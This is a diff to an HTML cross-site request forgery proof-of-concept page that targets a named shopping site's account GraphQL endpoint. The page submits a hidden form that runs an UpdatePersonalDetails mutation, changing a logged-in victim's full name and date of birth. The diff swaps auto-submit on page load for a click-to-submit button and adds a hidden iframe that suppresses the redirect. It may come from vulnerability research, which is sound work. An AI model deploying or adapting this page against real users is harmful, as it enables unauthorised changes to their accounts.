@@ -1,7 +1,9 @@
 <!DOCTYPE html>
 <html>
-  <body onload="document.forms[0].submit()">
-    <form action="https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails" method="POST" enctype="text/plain">
+  <body>
+    <h3>Manual CSRF PoC: Update Personal Details via GraphQL</h3>
+
+    <form action="https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails" method="POST" target="csrf_iframe">
       <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: [SettingsFieldInput!]!) {
         updateAccountSettings(input: $input) {
           error
@@ -13,8 +15,11 @@
           }
         }
       }'>
-      <input type="hidden" name="variables" value='{"input":[{"fieldName":"fullName","value":"CSRF Tester"},{"fieldName":"dateOfBirth","value":"01-01-2001"}]}'>
-      <input type="submit" value="Submit CSRF">
+      <input type="hidden" name="variables" value='{"input":[{"fieldName":"fullName","value":"CSRF Manual"},{"fieldName":"dateOfBirth","value":"2000-01-01"}]}'>
+      <input type="submit" value="Click to Submit CSRF">
     </form>
+
+    <!-- Hidden iframe to avoid redirect -->
+    <iframe name="csrf_iframe" style="display:none;"></iframe>
   </body>
 </html>
